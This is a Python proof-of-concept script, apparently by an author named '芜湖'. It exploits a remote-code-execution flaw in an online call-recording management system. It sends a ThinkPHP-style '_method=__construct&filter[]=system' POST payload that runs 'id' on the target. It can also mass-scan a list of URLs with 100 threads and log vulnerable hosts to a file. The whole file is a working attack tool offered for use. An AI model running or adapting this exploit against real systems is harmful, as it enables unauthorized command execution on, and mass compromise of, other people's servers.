import requests,argparse,sys,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    text = """██╗    ██╗██╗   ██╗        ██╗  ██╗██╗   ██╗
██║    ██║██║   ██║        ██║  ██║██║   ██║
██║ █╗ ██║██║   ██║        ███████║██║   ██║
██║███╗██║██║   ██║        ██╔══██║██║   ██║
╚███╔███╔╝╚██████╔╝███████╗██║  ██║╚██████╔╝
 ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ 
               author=芜湖
               version=1.1.1                             """
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description="申瓯通信设备有限公司在线录音管理系统RCE漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='please input your url ')
    parser.add_argument('-f', '--file', dest='file', type=str, help='please input your file ')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        file_url = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                file_url.append(url.strip())
        mp = Pool(100)
        mp.map(poc,file_url)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')


def poc(target):
    payload = '/callcenter/public/index.php/index.php?s=index/index/index'
    headers = {
        'User-Agent': 'Mozilla/5.0(WindowsNT10.0;Win64;x64)AppleWebKit/537.36(KHTML,likeGecko)Chrome/83.0.4103.116Safari/537.36',
        'Content-type': 'application/x-www-form-urlencoded',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Accept': 'text/html,image/gif,image/jpeg,*;q=.2,*/*;q=.2',
        'Connection': 'close',
        'Content-Length': '62',
    }
    data = 's=id&_method=__construct&method=POST&filter[]=system'
    # proxies = {
    #         'http':'http://127.0.0.1:8080',
    #         'https':'http://127.0.0.1:8080',
    #     }
    try:
        res = requests.post(url=target+payload,headers=headers,data=data,verify=False,timeout=5)
        # print(res.text)
        if 'uid' in res.text:
            print(f'[+]存在漏洞{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            print(f'[-]不存在漏洞{target}')
    except:
        print('该站点存在问题')


if __name__ == '__main__':
    main()